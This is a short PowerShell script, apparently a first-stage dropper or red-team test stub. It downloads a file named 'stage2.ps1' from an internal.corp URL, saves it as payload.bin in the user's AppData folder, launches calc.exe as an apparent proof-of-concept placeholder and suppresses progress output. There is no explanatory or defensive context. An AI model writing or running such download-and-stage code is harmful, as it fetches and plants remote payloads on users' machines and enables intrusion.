
[CmdletBinding()]
param(
    [string]$Stage2Url = "https://internal.corp/stage2.ps1",
    [string]$PayloadPath = "$env:APPDATA\payload.bin"
)
(New-Object System.Net.WebClient).DownloadFile($Stage2Url, $PayloadPath)
Start-Process -FilePath "calc.exe"
$ProgressPreference = "SilentlyContinue"
